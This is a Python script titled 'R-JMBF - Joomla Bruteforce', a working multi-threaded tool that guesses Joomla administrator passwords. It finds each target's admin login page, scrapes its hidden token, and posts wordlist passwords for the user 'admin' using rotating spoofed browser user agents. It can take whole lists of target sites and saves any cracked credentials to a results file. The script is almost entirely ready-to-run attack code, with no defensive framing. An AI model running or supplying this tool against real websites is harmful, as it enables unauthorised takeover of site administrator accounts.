print("""
 /$$$$$$$            /$$$$$ /$$      /$$ /$$$$$$$  /$$$$$$$$
| $$__  $$          |__  $$| $$$    /$$$| $$__  $$| $$_____/
| $$  \ $$             | $$| $$$$  /$$$$| $$  \ $$| $$      
| $$$$$$$/ /$$$$$$     | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   
| $$__  $$|______//$$  | $$| $$  $$$| $$| $$__  $$| $$__/   
| $$  \ $$       | $$  | $$| $$\  $ | $$| $$  \ $$| $$      
| $$  | $$       |  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$      
|__/  |__/        \______/ |__/     |__/|_______/ |__/      
                                                            
============================================================
[*] [R-JMBF - Joomla Bruteforce] | [R&D ICWR - Afrizal F.A]
============================================================
""")

import os, re, sys, random, requests, concurrent.futures
from argparse import ArgumentParser

class rusher:

    def count_percent(self):

        self.percent = self.done_process / self.total_process * 100

    def useragent(self):

        arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
        return arr[random.randint(0, len(arr) - 1)]

    def check_joomla(self, target):

        try:

            head = {
                "User-Agent": self.useragent()
            }
            r = requests.get(url="{}/administrator/index.php".format(target), headers=head, timeout=self.args.timeout)

            if r.status_code == 200:

                return True

            else:

                return False

        except:

            return False

    def check_login(self, target, passwd):

        try:

            head = {
                "User-Agent": self.useragent()
            }
            r = requests.Session()

            get_page = r.get("{}/administrator/index.php".format(target), headers=head, timeout=self.args.timeout)

            try:

                token = re.findall('type="hidden" name="(.*)" value="1"', get_page.text)[0]
                option = re.findall('type="hidden" name="option" value="(.*)"', get_page.text)[0]

            except:

                token = ""
                option = "com_login"

            postdata = {
                "username": "admin",
                "password": passwd,
                "lang": "en-GB",
                "option": option,
                "task": "login",
                token: "1"
            }

            check = r.post(url="{}/administrator/index.php".format(target), data=postdata, headers=head, timeout=self.args.timeout)

            if 'logout' in check.text:
                
                open("result-jm/success.txt", "a").write("{}|{}|{}\n".format(target, "admin", passwd))
                self.result += 1

            self.done_process += 1
            self.count_percent()

        except:

            if self.try_login < 3:

                self.try_login += 1
                self.check_login(target, passwd)

            elif self.try_login > 3:

                self.try_login = 0
                self.done_process += 1
                self.count_percent()

        sys.stdout.write("\r[*] [Proccess] [{}/{} | {}%] [Result: {}/{}]".format(self.done_process, self.total_process, round(self.percent), self.result, self.target))
        sys.stdout.flush()

    def execute(self, target):

        if self.check_joomla(target):

            self.total_process += len(open(self.args.wordlist).read().splitlines())

            for passwd in open(self.args.wordlist).read().splitlines():

                concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread).submit(self.check_login, target, passwd)

    def __init__(self):

        if not os.path.isdir("result-jm"):

            os.mkdir("result-jm")

        self.done_process = 0
        self.try_login = 0
        self.total_process = 0
        self.result = 0
        parser = ArgumentParser()
        parser.add_argument("-x", "--target", required=True)
        parser.add_argument("-w", "--wordlist", required=True)
        parser.add_argument("-t", "--thread", required=True, type=int)
        parser.add_argument("-d", "--timeout", required=True, type=int)
        self.args = parser.parse_args()
        print("[*] [Wordlist: {}] [List: {}]".format(self.args.wordlist, len(open(self.args.wordlist).read().splitlines())))
        print("[*] [Thread: {}]".format(self.args.thread))
        print("[*] [Timeout: {}]".format(self.args.timeout))

        if os.path.isfile(self.args.target):

            if os.path.isfile(self.args.wordlist):

                print("[*] [Bruteforcing]")
                self.target = len(open(self.args.target).read().splitlines())
                concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread).map(self.execute, open(self.args.target).read().splitlines())

            else:

                print("[-] [Error] [Not found {}]".format(self.args.wordlist))

        else:

            if os.path.isfile(self.args.wordlist):

                print("[*] [Bruteforcing]")
                self.target = 1
                self.execute(self.args.target)

            else:

                print("[-] [Error] [Not found {}]".format(self.args.wordlist))

        print("\n")

        if self.result > 0:

            print("[+] [View Result: result-jm/success.txt]")

            print("\n")

            for x in open("result-jm/success.txt").read().splitlines():

                print("[+] [{}]".format(x))

        else:

            print("[-] [No Result]")

        print("\n")
        print("[*] [Done]")

rusher() if __name__ == "__main__" else exit()
